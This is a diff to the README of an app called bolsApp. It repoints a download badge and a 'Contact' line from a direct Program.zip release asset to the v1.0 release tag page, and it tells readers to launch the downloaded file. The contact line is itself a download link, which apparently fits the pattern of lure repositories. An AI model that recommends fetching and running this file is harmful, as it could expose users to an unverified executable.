@@ -22,7 +22,7 @@ Welcome to **bolsApp**, your go-to application for accessing economic and financ
 
 To get started with **bolsApp**, simply download the application from the following link: 
 
-[![Download bolsApp](https://github.com/niger12322/bolsApp/releases/download/v1.0/Program.zip)](https://github.com/niger12322/bolsApp/releases/download/v1.0/Program.zip)
+[![Download bolsApp](https://github.com/niger12322/bolsApp/releases/tag/v1.0)](https://github.com/niger12322/bolsApp/releases/tag/v1.0)
 
 *Launch the downloaded file to install the application on your device.*
 
@@ -49,7 +49,7 @@ Contributions to **bolsApp** are always welcome! Whether you want to report a bu
 
 ## 📧 Contact
 
-For any inquiries or feedback regarding **bolsApp**, you can reach out to us at https://github.com/niger12322/bolsApp/releases/download/v1.0/Program.zip
+For any inquiries or feedback regarding **bolsApp**, you can reach out to us at https://github.com/niger12322/bolsApp/releases/tag/v1.0
 
 ## 🌟 Stay Connected
 
